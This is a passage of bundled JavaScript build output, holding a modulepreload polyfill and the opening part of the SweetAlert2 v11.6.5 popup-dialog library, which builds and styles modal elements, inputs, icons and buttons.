(function polyfill() {
  const relList = document.createElement("link").relList;
  if (relList && relList.supports && relList.supports("modulepreload")) {
    return;
  }
  for (const link of document.querySelectorAll('link[rel="modulepreload"]')) {
    processPreload(link);
  }
  new MutationObserver((mutations) => {
    for (const mutation of mutations) {
      if (mutation.type !== "childList") {
        continue;
      }
      for (const node of mutation.addedNodes) {
        if (node.tagName === "LINK" && node.rel === "modulepreload")
          processPreload(node);
      }
    }
  }).observe(document, { childList: true, subtree: true });
  function getFetchOpts(script) {
    const fetchOpts = {};
    if (script.integrity)
      fetchOpts.integrity = script.integrity;
    if (script.referrerpolicy)
      fetchOpts.referrerPolicy = script.referrerpolicy;
    if (script.crossorigin === "use-credentials")
      fetchOpts.credentials = "include";
    else if (script.crossorigin === "anonymous")
      fetchOpts.credentials = "omit";
    else
      fetchOpts.credentials = "same-origin";
    return fetchOpts;
  }
  function processPreload(link) {
    if (link.ep)
      return;
    link.ep = true;
    const fetchOpts = getFetchOpts(link);
    fetch(link.href, fetchOpts);
  }
})();
var commonjsGlobal = typeof globalThis !== "undefined" ? globalThis : typeof window !== "undefined" ? window : typeof global !== "undefined" ? global : typeof self !== "undefined" ? self : {};
var sweetalert2_all = { exports: {} };
/*!
* sweetalert2 v11.6.5
* Released under the MIT License.
*/
(function(module, exports) {
  (function(global2, factory) {
    module.exports = factory();
  })(commonjsGlobal, function() {
    var privateProps = {
      awaitingPromise: /* @__PURE__ */ new WeakMap(),
      promise: /* @__PURE__ */ new WeakMap(),
      innerParams: /* @__PURE__ */ new WeakMap(),
      domCache: /* @__PURE__ */ new WeakMap()
    };
    const swalPrefix = "swal2-";
    const prefix = (items) => {
      const result = {};
      for (const i in items) {
        result[items[i]] = swalPrefix + items[i];
      }
      return result;
    };
    const swalClasses = prefix(["container", "shown", "height-auto", "iosfix", "popup", "modal", "no-backdrop", "no-transition", "toast", "toast-shown", "show", "hide", "close", "title", "html-container", "actions", "confirm", "deny", "cancel", "default-outline", "footer", "icon", "icon-content", "image", "input", "file", "range", "select", "radio", "checkbox", "label", "textarea", "inputerror", "input-label", "validation-message", "progress-steps", "active-progress-step", "progress-step", "progress-step-line", "loader", "loading", "styled", "top", "top-start", "top-end", "top-left", "top-right", "center", "center-start", "center-end", "center-left", "center-right", "bottom", "bottom-start", "bottom-end", "bottom-left", "bottom-right", "grow-row", "grow-column", "grow-fullscreen", "rtl", "timer-progress-bar", "timer-progress-bar-container", "scrollbar-measure", "icon-success", "icon-warning", "icon-info", "icon-question", "icon-error", "no-war"]);
    const iconTypes = prefix(["success", "warning", "info", "question", "error"]);
    const consolePrefix = "SweetAlert2:";
    const uniqueArray = (arr) => {
      const result = [];
      for (let i = 0; i < arr.length; i++) {
        if (result.indexOf(arr[i]) === -1) {
          result.push(arr[i]);
        }
      }
      return result;
    };
    const capitalizeFirstLetter = (str) => str.charAt(0).toUpperCase() + str.slice(1);
    const warn2 = (message) => {
      console.warn(`${consolePrefix} ${typeof message === "object" ? message.join(" ") : message}`);
    };
    const error2 = (message) => {
      console.error(`${consolePrefix} ${message}`);
    };
    const previousWarnOnceMessages = [];
    const warnOnce = (message) => {
      if (!previousWarnOnceMessages.includes(message)) {
        previousWarnOnceMessages.push(message);
        warn2(message);
      }
    };
    const warnAboutDeprecation = (deprecatedParam, useInstead) => {
      warnOnce(`"${deprecatedParam}" is deprecated and will be removed in the next major release. Please use "${useInstead}" instead.`);
    };
    const callIfFunction = (arg) => typeof arg === "function" ? arg() : arg;
    const hasToPromiseFn = (arg) => arg && typeof arg.toPromise === "function";
    const asPromise = (arg) => hasToPromiseFn(arg) ? arg.toPromise() : Promise.resolve(arg);
    const isPromise = (arg) => arg && Promise.resolve(arg) === arg;
    const getContainer = () => document.body.querySelector(`.${swalClasses.container}`);
    const elementBySelector = (selectorString) => {
      const container = getContainer();
      return container ? container.querySelector(selectorString) : null;
    };
    const elementByClass = (className) => {
      return elementBySelector(`.${className}`);
    };
    const getPopup = () => elementByClass(swalClasses.popup);
    const getIcon = () => elementByClass(swalClasses.icon);
    const getIconContent = () => elementByClass(swalClasses["icon-content"]);
    const getTitle = () => elementByClass(swalClasses.title);
    const getHtmlContainer = () => elementByClass(swalClasses["html-container"]);
    const getImage = () => elementByClass(swalClasses.image);
    const getProgressSteps$1 = () => elementByClass(swalClasses["progress-steps"]);
    const getValidationMessage = () => elementByClass(swalClasses["validation-message"]);
    const getConfirmButton = () => elementBySelector(`.${swalClasses.actions} .${swalClasses.confirm}`);
    const getDenyButton = () => elementBySelector(`.${swalClasses.actions} .${swalClasses.deny}`);
    const getInputLabel = () => elementByClass(swalClasses["input-label"]);
    const getLoader = () => elementBySelector(`.${swalClasses.loader}`);
    const getCancelButton = () => elementBySelector(`.${swalClasses.actions} .${swalClasses.cancel}`);
    const getActions = () => elementByClass(swalClasses.actions);
    const getFooter = () => elementByClass(swalClasses.footer);
    const getTimerProgressBar = () => elementByClass(swalClasses["timer-progress-bar"]);
    const getCloseButton = () => elementByClass(swalClasses.close);
    const focusable = `
  a[href],
  area[href],
  input:not([disabled]),
  select:not([disabled]),
  textarea:not([disabled]),
  button:not([disabled]),
  iframe,
  object,
  embed,
  [tabindex="0"],
  [contenteditable],
  audio[controls],
  video[controls],
  summary
`;
    const getFocusableElements = () => {
      const focusableElementsWithTabindex = Array.from(getPopup().querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])')).sort((a, b) => {
        const tabindexA = parseInt(a.getAttribute("tabindex"));
        const tabindexB = parseInt(b.getAttribute("tabindex"));
        if (tabindexA > tabindexB) {
          return 1;
        } else if (tabindexA < tabindexB) {
          return -1;
        }
        return 0;
      });
      const otherFocusableElements = Array.from(getPopup().querySelectorAll(focusable)).filter((el) => el.getAttribute("tabindex") !== "-1");
      return uniqueArray(focusableElementsWithTabindex.concat(otherFocusableElements)).filter((el) => isVisible$1(el));
    };
    const isModal = () => {
      return hasClass(document.body, swalClasses.shown) && !hasClass(document.body, swalClasses["toast-shown"]) && !hasClass(document.body, swalClasses["no-backdrop"]);
    };
    const isToast = () => {
      return getPopup() && hasClass(getPopup(), swalClasses.toast);
    };
    const isLoading = () => {
      return getPopup().hasAttribute("data-loading");
    };
    const states = {
      previousBodyPadding: null
    };
    const setInnerHtml = (elem, html) => {
      elem.textContent = "";
      if (html) {
        const parser = new DOMParser();
        const parsed = parser.parseFromString(html, `text/html`);
        Array.from(parsed.querySelector("head").childNodes).forEach((child) => {
          elem.appendChild(child);
        });
        Array.from(parsed.querySelector("body").childNodes).forEach((child) => {
          if (child instanceof HTMLVideoElement || child instanceof HTMLAudioElement) {
            elem.appendChild(child.cloneNode(true));
          } else {
            elem.appendChild(child);
          }
        });
      }
    };
    const hasClass = (elem, className) => {
      if (!className) {
        return false;
      }
      const classList = className.split(/\s+/);
      for (let i = 0; i < classList.length; i++) {
        if (!elem.classList.contains(classList[i])) {
          return false;
        }
      }
      return true;
    };
    const removeCustomClasses = (elem, params) => {
      Array.from(elem.classList).forEach((className) => {
        if (!Object.values(swalClasses).includes(className) && !Object.values(iconTypes).includes(className) && !Object.values(params.showClass).includes(className)) {
          elem.classList.remove(className);
        }
      });
    };
    const applyCustomClass = (elem, params, className) => {
      removeCustomClasses(elem, params);
      if (params.customClass && params.customClass[className]) {
        if (typeof params.customClass[className] !== "string" && !params.customClass[className].forEach) {
          warn2(`Invalid type of customClass.${className}! Expected string or iterable object, got "${typeof params.customClass[className]}"`);
          return;
        }
        addClass(elem, params.customClass[className]);
      }
    };
    const getInput$1 = (popup, inputClass) => {
      if (!inputClass) {
        return null;
      }
      switch (inputClass) {
        case "select":
        case "textarea":
        case "file":
          return popup.querySelector(`.${swalClasses.popup} > .${swalClasses[inputClass]}`);
        case "checkbox":
          return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.checkbox} input`);
        case "radio":
          return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:checked`) || popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:first-child`);
        case "range":
          return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.range} input`);
        default:
          return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.input}`);
      }
    };
    const focusInput = (input) => {
      input.focus();
      if (input.type !== "file") {
        const val = input.value;
        input.value = "";
        input.value = val;
      }
    };
    const toggleClass = (target, classList, condition) => {
      if (!target || !classList) {
        return;
      }
      if (typeof classList === "string") {
        classList = classList.split(/\s+/).filter(Boolean);
      }
      classList.forEach((className) => {
        if (Array.isArray(target)) {
          target.forEach((elem) => {
            condition ? elem.classList.add(className) : elem.classList.remove(className);
          });
        } else {
          condition ? target.classList.add(className) : target.classList.remove(className);
        }
      });
    };
    const addClass = (target, classList) => {
      toggleClass(target, classList, true);
    };
    const removeClass = (target, classList) => {
      toggleClass(target, classList, false);
    };
    const getDirectChildByClass = (elem, className) => {
      const children = Array.from(elem.children);
      for (let i = 0; i < children.length; i++) {
        const child = children[i];
        if (child instanceof HTMLElement && hasClass(child, className)) {
          return child;
        }
      }
    };
    const applyNumericalStyle = (elem, property, value) => {
      if (value === `${parseInt(value)}`) {
        value = parseInt(value);
      }
      if (value || parseInt(value) === 0) {
        elem.style[property] = typeof value === "number" ? `${value}px` : value;
      } else {
        elem.style.removeProperty(property);
      }
    };
    const show = function(elem) {
      let display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "flex";
      elem.style.display = display;
    };
    const hide = (elem) => {
      elem.style.display = "none";
    };
    const setStyle = (parent, selector, property, value) => {
      const el = parent.querySelector(selector);
      if (el) {
        el.style[property] = value;
      }
    };
    const toggle = function(elem, condition) {
      let display = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : "flex";
      condition ? show(elem, display) : hide(elem);
    };
    const isVisible$1 = (elem) => !!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
    const allButtonsAreHidden = () => !isVisible$1(getConfirmButton()) && !isVisible$1(getDenyButton()) && !isVisible$1(getCancelButton());
    const isScrollable = (elem) => !!(elem.scrollHeight > elem.clientHeight);
    const hasCssAnimation = (elem) => {
      const style = window.getComputedStyle(elem);
      const animDuration = parseFloat(style.getPropertyValue("animation-duration") || "0");
      const transDuration = parseFloat(style.getPropertyValue("transition-duration") || "0");
      return animDuration > 0 || transDuration > 0;
    };
    const animateTimerProgressBar = function(timer) {
      let reset = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : false;
      const timerProgressBar = getTimerProgressBar();
      if (isVisible$1(timerProgressBar)) {
        if (reset) {
          timerProgressBar.style.transition = "none";
          timerProgressBar.style.width = "100%";
        }
        setTimeout(() => {
          timerProgressBar.style.transition = `width ${timer / 1e3}s linear`;
          timerProgressBar.style.width = "0%";
        }, 10);
      }
    };
    const stopTimerProgressBar = () => {
      const timerProgressBar = getTimerProgressBar();
      const timerProgressBarWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
      timerProgressBar.style.removeProperty("transition");
      timerProgressBar.style.width = "100%";
      const timerProgressBarFullWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
      const timerProgressBarPercent = timerProgressBarWidth / timerProgressBarFullWidth * 100;
      timerProgressBar.style.removeProperty("transition");
      timerProgressBar.style.width = `${timerProgressBarPercent}%`;
    };
    const RESTORE_FOCUS_TIMEOUT = 100;
    const globalState = {};
    const focusPreviousActiveElement = () => {
      if (globalState.previousActiveElement instanceof HTMLElement) {
        globalState.previousActiveElement.focus();
        globalState.previousActiveElement = null;
      } else if (document.body) {
        document.body.focus();
      }
    };
    const restoreActiveElement = (returnFocus) => {
      return new Promise((resolve) => {
        if (!returnFocus) {
          return resolve();
        }
        const x = window.scrollX;
        const y = window.scrollY;
        globalState.restoreFocusTimeout = setTimeout(() => {
          focusPreviousActiveElement();
          resolve();
        }, RESTORE_FOCUS_TIMEOUT);
        window.scrollTo(x, y);
      });
    };
    const isNodeEnv = () => typeof window === "undefined" || typeof document === "undefined";
    const sweetHTML = `
 <div aria-labelledby="${swalClasses.title}" aria-describedby="${swalClasses["html-container"]}" class="${swalClasses.popup}" tabindex="-1">
   <button type="button" class="${swalClasses.close}"></button>
   <ul class="${swalClasses["progress-steps"]}"></ul>
   <div class="${swalClasses.icon}"></div>
   <img class="${swalClasses.image}" />
   <h2 class="${swalClasses.title}" id="${swalClasses.title}"></h2>
   <div class="${swalClasses["html-container"]}" id="${swalClasses["html-container"]}"></div>
   <input class="${swalClasses.input}" />
   <input type="file" class="${swalClasses.file}" />
   <div class="${swalClasses.range}">
     <input type="range" />
     <output></output>
   </div>
   <select class="${swalClasses.select}"></select>
   <div class="${swalClasses.radio}"></div>
   <label for="${swalClasses.checkbox}" class="${swalClasses.checkbox}">
     <input type="checkbox" />
     <span class="${swalClasses.label}"></span>
   </label>
   <textarea class="${swalClasses.textarea}"></textarea>
   <div class="${swalClasses["validation-message"]}" id="${swalClasses["validation-message"]}"></div>
   <div class="${swalClasses.actions}">
     <div class="${swalClasses.loader}"></div>
     <button type="button" class="${swalClasses.confirm}"></button>
     <button type="button" class="${swalClasses.deny}"></button>
     <button type="button" class="${swalClasses.cancel}"></button>
   </div>
   <div class="${swalClasses.footer}"></div>
   <div class="${swalClasses["timer-progress-bar-container"]}">
     <div class="${swalClasses["timer-progress-bar"]}"></div>
   </div>
 </div>
`.replace(/(^|\n)\s*/g, "");
    const resetOldContainer = () => {
      const oldContainer = getContainer();
      if (!oldContainer) {
        return false;
      }
      oldContainer.remove();
      removeClass([document.documentElement, document.body], [swalClasses["no-backdrop"], swalClasses["toast-shown"], swalClasses["has-column"]]);
      return true;
    };
    const resetValidationMessage$1 = () => {
      globalState.currentInstance.resetValidationMessage();
    };
    const addInputChangeListeners = () => {
      const popup = getPopup();
      const input = getDirectChildByClass(popup, swalClasses.input);
      const file = getDirectChildByClass(popup, swalClasses.file);
      const range = popup.querySelector(`.${swalClasses.range} input`);
      const rangeOutput = popup.querySelector(`.${swalClasses.range} output`);
      const select = getDirectChildByClass(popup, swalClasses.select);
      const checkbox = popup.querySelector(`.${swalClasses.checkbox} input`);
      const textarea = getDirectChildByClass(popup, swalClasses.textarea);
      input.oninput = resetValidationMessage$1;
      file.onchange = resetValidationMessage$1;
      select.onchange = resetValidationMessage$1;
      checkbox.onchange = resetValidationMessage$1;
      textarea.oninput = resetValidationMessage$1;
      range.oninput = () => {
        resetValidationMessage$1();
        rangeOutput.value = range.value;
      };
      range.onchange = () => {
        resetValidationMessage$1();
        rangeOutput.value = range.value;
      };
    };
    const getTarget = (target) => typeof target === "string" ? document.querySelector(target) : target;
    const setupAccessibility = (params) => {
      const popup = getPopup();
      popup.setAttribute("role", params.toast ? "alert" : "dialog");
      popup.setAttribute("aria-live", params.toast ? "polite" : "assertive");
      if (!params.toast) {
        popup.setAttribute("aria-modal", "true");
      }
    };
    const setupRTL = (targetElement) => {
      if (window.getComputedStyle(targetElement).direction === "rtl") {
        addClass(getContainer(), swalClasses.rtl);
      }
    };
    const init = (params) => {
      const oldContainerExisted = resetOldContainer();
      if (isNodeEnv()) {
        error2("SweetAlert2 requires document to initialize");
        return;
      }
      const container = document.createElement("div");
      container.className = swalClasses.container;
      if (oldContainerExisted) {
        addClass(container, swalClasses["no-transition"]);
      }
      setInnerHtml(container, sweetHTML);
      const targetElement = getTarget(params.target);
      targetElement.appendChild(container);
      setupAccessibility(params);
      setupRTL(targetElement);
      addInputChangeListeners();
    };
    const parseHtmlToContainer = (param, target) => {
      if (param instanceof HTMLElement) {
        target.appendChild(param);
      } else if (typeof param === "object") {
        handleObject(param, target);
      } else if (param) {
        setInnerHtml(target, param);
      }
    };
    const handleObject = (param, target) => {
      if (param.jquery) {
        handleJqueryElem(target, param);
      } else {
        setInnerHtml(target, param.toString());
      }
    };
    const handleJqueryElem = (target, elem) => {
      target.textContent = "";
      if (0 in elem) {
        for (let i = 0; i in elem; i++) {
          target.appendChild(elem[i].cloneNode(true));
        }
      } else {
        target.appendChild(elem.cloneNode(true));
      }
    };
    const animationEndEvent = (() => {
      if (isNodeEnv()) {
        return false;
      }
      const testEl = document.createElement("div");
      const transEndEventNames = {
        WebkitAnimation: "webkitAnimationEnd",
        animation: "animationend"
      };
      for (const i in transEndEventNames) {
        if (Object.prototype.hasOwnProperty.call(transEndEventNames, i) && typeof testEl.style[i] !== "undefined") {
          return transEndEventNames[i];
        }
      }
      return false;
    })();
    const measureScrollbar = () => {
      const scrollDiv = document.createElement("div");
      scrollDiv.className = swalClasses["scrollbar-measure"];
      document.body.appendChild(scrollDiv);
      const scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
      document.body.removeChild(scrollDiv);
      return scrollbarWidth;
    };
    const renderActions = (instance, params) => {
      const actions = getActions();
      const loader = getLoader();
      if (!params.showConfirmButton && !params.showDenyButton && !params.showCancelButton) {
        hide(actions);
      } else {
        show(actions);
      }
      applyCustomClass(actions, params, "actions");
      renderButtons(actions, loader, params);
      setInnerHtml(loader, params.loaderHtml);
      applyCustomClass(loader, params, "loader");
    };
    function renderButtons(actions, loader, params) {
      const confirmButton = getConfirmButton();
      const denyButton = getDenyButton();
      const cancelButton = getCancelButton();
      renderButton(confirmButton, "confirm", params);
      renderButton(denyButton, "deny", params);
      renderButton(cancelButton, "cancel", params);
      handleButtonsStyling(confirmButton, denyButton, cancelButton, params);
      if (params.reverseButtons) {
        if (params.toast) {
          actions.insertBefore(cancelButton, confirmButton);
          actions.insertBefore(denyButton, confirmButton);
        } else {
          actions.insertBefore(cancelButton, loader);
          actions.insertBefore(denyButton, loader);
          actions.insertBefore(confirmButton, loader);
        }
      }
    }
    function handleButtonsStyling(confirmButton, denyButton, cancelButton, params) {
      if (!params.buttonsStyling) {
        removeClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
        return;
      }
      addClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
      if (params.confirmButtonColor) {
        confirmButton.style.backgroundColor = params.confirmButtonColor;
        addClass(confirmButton, swalClasses["default-outline"]);
      }
      if (params.denyButtonColor) {
        denyButton.style.backgroundColor = params.denyButtonColor;
        addClass(denyButton, swalClasses["default-outline"]);
      }
      if (params.cancelButtonColor) {
        cancelButton.style.backgroundColor = params.cancelButtonColor;
        addClass(cancelButton, swalClasses["default-outline"]);
      }
    }
    function renderButton(button, buttonType, params) {
      toggle(button, params[`show${capitalizeFirstLetter(buttonType)}Button`], "inline-block");
      setInnerHtml(button, params[`${buttonType}ButtonText`]);
      button.setAttribute("aria-label", params[`${buttonType}ButtonAriaLabel`]);
      button.className = swalClasses[buttonType];
      applyCustomClass(button, params, `${buttonType}Button`);
      addClass(button, params[`${buttonType}ButtonClass`]);
    }
    const renderCloseButton = (instance, params) => {
      const closeButton = getCloseButton();
      setInnerHtml(closeButton, params.closeButtonHtml);
      applyCustomClass(closeButton, params, "closeButton");
      toggle(closeButton, params.showCloseButton);
      closeButton.setAttribute("aria-label", params.closeButtonAriaLabel);
    };
    const renderContainer = (instance, params) => {
      const container = getContainer();
      if (!container) {
        return;
      }
      handleBackdropParam(container, params.backdrop);
      handlePositionParam(container, params.position);
      handleGrowParam(container, params.grow);
      applyCustomClass(container, params, "container");
    };
    function handleBackdropParam(container, backdrop) {
      if (typeof backdrop === "string") {
        container.style.background = backdrop;
      } else if (!backdrop) {
        addClass([document.documentElement, document.body], swalClasses["no-backdrop"]);
      }
    }
    function handlePositionParam(container, position) {
      if (position in swalClasses) {
        addClass(container, swalClasses[position]);
      } else {
        warn2('The "position" parameter is not valid, defaulting to "center"');
        addClass(container, swalClasses.center);
      }
    }
    function handleGrowParam(container, grow) {
      if (grow && typeof grow === "string") {
        const growClass = `grow-${grow}`;
        if (growClass in swalClasses) {
          addClass(container, swalClasses[growClass]);
        }
      }
    }
    const inputClasses = ["input", "file", "range", "select", "radio", "checkbox", "textarea"];
    const renderInput = (instance, params) => {
      const popup = getPopup();
      const innerParams = privateProps.innerParams.get(instance);
      const rerender = !innerParams || params.input !== innerParams.input;
      inputClasses.forEach((inputClass) => {
        const inputContainer = getDirectChildByClass(popup, swalClasses[inputClass]);
        setAttributes(inputClass, params.inputAttributes);
        inputContainer.className = swalClasses[inputClass];
        if (rerender) {
          hide(inputContainer);
        }
      });
      if (params.input) {
        if (rerender) {
          showInput(params);
        }
        setCustomClass(params);
      }
    };
    const showInput = (params) => {
      if (!renderInputType[params.input]) {
        error2(`Unexpected type of input! Expected "text", "email", "password", "number", "tel", "select", "radio", "checkbox", "textarea", "file" or "url", got "${params.input}"`);
        return;
      }
      const inputContainer = getInputContainer(params.input);
      const input = renderInputType[params.input](inputContainer, params);
      show(inputContainer);
      setTimeout(() => {
        focusInput(input);
      });
    };
    const removeAttributes = (input) => {
      for (let i = 0; i < input.attributes.length; i++) {
        const attrName = input.attributes[i].name;
        if (!["type", "value", "style"].includes(attrName)) {
          input.removeAttribute(attrName);
        }
      }
    };
    const setAttributes = (inputClass, inputAttributes) => {
      const input = getInput$1(getPopup(), inputClass);
      if (!input) {
        return;
      }
      removeAttributes(input);
      for (const attr in inputAttributes) {
        input.setAttribute(attr, inputAttributes[attr]);
      }
    };
    const setCustomClass = (params) => {
      const inputContainer = getInputContainer(params.input);
      if (typeof params.customClass === "object") {
        addClass(inputContainer, params.customClass.input);
      }
    };
    const setInputPlaceholder = (input, params) => {
      if (!input.placeholder || params.inputPlaceholder) {
        input.placeholder = params.inputPlaceholder;
      }
    };
    const setInputLabel = (input, prependTo, params) => {
      if (params.inputLabel) {
        input.id = swalClasses.input;
        const label = document.createElement("label");
        const labelClass = swalClasses["input-label"];
        label.setAttribute("for", input.id);
        label.className = labelClass;
        if (typeof params.customClass === "object") {
          addClass(label, params.customClass.inputLabel);
        }
        label.innerText = params.inputLabel;
        prependTo.insertAdjacentElement("beforebegin", label);
      }
    };
    const getInputContainer = (inputType) => {
      return getDirectChildByClass(getPopup(), swalClasses[inputType] || swalClasses.input);
    };
    const checkAndSetInputValue = (input, inputValue) => {
      if (["string", "number"].includes(typeof inputValue)) {
        input.value = `${inputValue}`;
      } else if (!isPromise(inputValue)) {
        warn2(`Unexpected type of inputValue! Expected "string", "number" or "Promise", got "${typeof inputValue}"`);
      }
    };
    const renderInputType = {};
    renderInputType.text = renderInputType.email = renderInputType.password = renderInputType.number = renderInputType.tel = renderInputType.url = (input, params) => {
      checkAndSetInputValue(input, params.inputValue);
      setInputLabel(input, input, params);
      setInputPlaceholder(input, params);
      input.type = params.input;
      return input;
    };
    renderInputType.file = (input, params) => {
      setInputLabel(input, input, params);
      setInputPlaceholder(input, params);
      return input;
    };
    renderInputType.range = (range, params) => {
      const rangeInput = range.querySelector("input");
      const rangeOutput = range.querySelector("output");
      checkAndSetInputValue(rangeInput, params.inputValue);
      rangeInput.type = params.input;
      checkAndSetInputValue(rangeOutput, params.inputValue);
      setInputLabel(rangeInput, range, params);
      return range;
    };
    renderInputType.select = (select, params) => {
      select.textContent = "";
      if (params.inputPlaceholder) {
        const placeholder = document.createElement("option");
        setInnerHtml(placeholder, params.inputPlaceholder);
        placeholder.value = "";
        placeholder.disabled = true;
        placeholder.selected = true;
        select.appendChild(placeholder);
      }
      setInputLabel(select, select, params);
      return select;
    };
    renderInputType.radio = (radio) => {
      radio.textContent = "";
      return radio;
    };
    renderInputType.checkbox = (checkboxContainer, params) => {
      const checkbox = getInput$1(getPopup(), "checkbox");
      checkbox.value = "1";
      checkbox.id = swalClasses.checkbox;
      checkbox.checked = Boolean(params.inputValue);
      const label = checkboxContainer.querySelector("span");
      setInnerHtml(label, params.inputPlaceholder);
      return checkbox;
    };
    renderInputType.textarea = (textarea, params) => {
      checkAndSetInputValue(textarea, params.inputValue);
      setInputPlaceholder(textarea, params);
      setInputLabel(textarea, textarea, params);
      const getMargin = (el) => parseInt(window.getComputedStyle(el).marginLeft) + parseInt(window.getComputedStyle(el).marginRight);
      setTimeout(() => {
        if ("MutationObserver" in window) {
          const initialPopupWidth = parseInt(window.getComputedStyle(getPopup()).width);
          const textareaResizeHandler = () => {
            const textareaWidth = textarea.offsetWidth + getMargin(textarea);
            if (textareaWidth > initialPopupWidth) {
              getPopup().style.width = `${textareaWidth}px`;
            } else {
              getPopup().style.width = null;
            }
          };
          new MutationObserver(textareaResizeHandler).observe(textarea, {
            attributes: true,
            attributeFilter: ["style"]
          });
        }
      });
      return textarea;
    };
    const renderContent = (instance, params) => {
      const htmlContainer = getHtmlContainer();
      applyCustomClass(htmlContainer, params, "htmlContainer");
      if (params.html) {
        parseHtmlToContainer(params.html, htmlContainer);
        show(htmlContainer, "block");
      } else if (params.text) {
        htmlContainer.textContent = params.text;
        show(htmlContainer, "block");
      } else {
        hide(htmlContainer);
      }
      renderInput(instance, params);
    };
    const renderFooter = (instance, params) => {
      const footer = getFooter();
      toggle(footer, params.footer);
      if (params.footer) {
        parseHtmlToContainer(params.footer, footer);
      }
      applyCustomClass(footer, params, "footer");
    };
    const renderIcon = (instance, params) => {
      const innerParams = privateProps.innerParams.get(instance);
      const icon = getIcon();
      if (innerParams && params.icon === innerParams.icon) {
        setContent(icon, params);
        applyStyles(icon, params);
        return;
      }
      if (!params.icon && !params.iconHtml) {
        hide(icon);
        return;
      }
      if (params.icon && Object.keys(iconTypes).indexOf(params.icon) === -1) {
        error2(`Unknown icon! Expected "success", "error", "warning", "info" or "question", got "${params.icon}"`);
        hide(icon);
        return;
      }
      show(icon);
      setContent(icon, params);
      applyStyles(icon, params);
      addClass(icon, params.showClass.icon);
    };
    const applyStyles = (icon, params) => {
      for (const iconType in iconTypes) {
        if (params.icon !== iconType) {
          removeClass(icon, iconTypes[iconType]);
        }
      }
      addClass(icon, iconTypes[params.icon]);
      setColor(icon, params);
      adjustSuccessIconBackgroundColor();
      applyCustomClass(icon, params, "icon");
    };
    const adjustSuccessIconBackgroundColor = () => {
      const popup = getPopup();
      const popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue("background-color");
      const successIconParts = popup.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
      for (let i = 0; i < successIconParts.length; i++) {
        successIconParts[i].style.backgroundColor = popupBackgroundColor;
      }
    };
    const successIconHtml = `
  <div class="swal2-success-circular-line-left"></div>
  <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>
  <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>
  <div class="swal2-success-circular-line-right"></div>
`;
    const errorIconHtml = `
  <span class="swal2-x-mark">
    <span class="swal2-x-mark-line-left"></span>
    <span class="swal2-x-mark-line-right"></span>
  </span>
`;
    const setContent = (icon, params) => {
      let oldContent = icon.innerHTML;
      let newContent;
      if (params.iconHtml) {
        newContent = iconContent(params.iconHtml);
      } else if (params.icon === "success") {
        newContent = successIconHtml;
        oldContent = oldContent.replace(/ style=".*?"/g, "");
      } else if (params.icon === "error") {
        newContent = errorIconHtml;
      } else {
        const defaultIconHtml = {
          question: "?",
          warning: "!",
          info: "i"
        };
        newContent = iconContent(defaultIconHtml[params.icon]);
      }
      if (oldContent.trim() !== newContent.trim()) {
        setInnerHtml(icon, newContent);
      }
    };
    const setColor = (icon, params) => {
      if (!params.iconColor) {
        return;
      }
      icon.style.color = params.iconColor;
      icon.style.borderColor = params.iconColor;
      for (const sel of [".swal2-success-line-tip", ".swal2-success-line-long", ".swal2-x-mark-line-left", ".swal2-x-mark-line-right"]) {
        setStyle(icon, sel, "backgroundColor", params.iconColor);
      }
      setStyle(icon, ".swal2-success-ring", "borderColor", params.iconColor);
    };
    const iconContent = (content) => `<div class="${swalClasses["icon-content"]}">${content}</div>`;
    const renderImage = (instance, params) => {
      const image = getImage();
      if (!params.imageUrl) {
        hide(image);
        return;
      }
      show(image, "");
      image.setAttribute("src", params.imageUrl);
      image.setAttribute("alt", params.imageAlt);
      applyNumericalStyle(image, "width", params.imageWidth);
      applyNumericalStyle(image, "height", params.imageHeight);
      image.className = swalClasses.image;
      applyCustomClass(image, params, "image");
    };
    const renderPopup = (instance, params) => {
      const container = getContainer();
      const popup = getPopup();
      if (params.toast) {
        applyNumericalStyle(container, "width", params.width);
        popup.style.width = "100%";
        popup.insertBefore(getLoader(), getIcon());
      } else {
        applyNumericalStyle(popup, "width", params.width);
      }
      applyNumericalStyle(popup, "padding", params.padding);
      if (params.color) {
        popup.style.color = params.color;
      }
      if (params.background) {
        popup.style.background = params.background;
      }
      hide(getValidationMessage());
      addClasses$1(popup, params);
    };
    const addClasses$1 = (popup, params) => {
      popup.className = `${swalClasses.popup} ${isVisible$1(popup) ? params.showClass.popup : ""}`;
      if (params.toast) {
        addClass([document.documentElement, document.body], swalClasses["toast-shown"]);
        addClass(popup, swalClasses.toast);
      } else {
        addClass(popup, swalClasses.modal);
      }
      applyCustomClass(popup, params, "popup");
      if (typeof params.customClass === "string") {
        addClass(popup, params.customClass);
      }
      if (params.icon) {
        addClass(popup, swalClasses[`icon-${params.icon}`]);
      }
    };
    const renderProgressSteps = (instance, params) => {
      const progressStepsContainer = getProgressSteps$1();
      if (!params.progressSteps || params.progressSteps.length === 0) {
        hide(progressStepsContainer);
        return;
      }
      show(progressStepsContainer);
      progressStepsContainer.textContent = "";
      if (params.currentProgressStep >= params.progressSteps.length) {
        warn2("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)");
      }
      params.progressSteps.forEach((step, index) => {
        const stepEl = createStepElement(step);
        progressStepsContainer.appendChild(stepEl);
        if (index === params.currentProgressStep) {
          addClass(stepEl, swalClasses["active-progress-step"]);
        }
        if (index !== params.progressSteps.length - 1) {
          const lineEl = createLineElement(params);
          progressStepsContainer.appendChild(lineEl);
        }
      });
    };
    const createStepElement = (step) => {
      const stepEl = document.createElement("li");
      addClass(stepEl, swalClasses["progress-step"]);
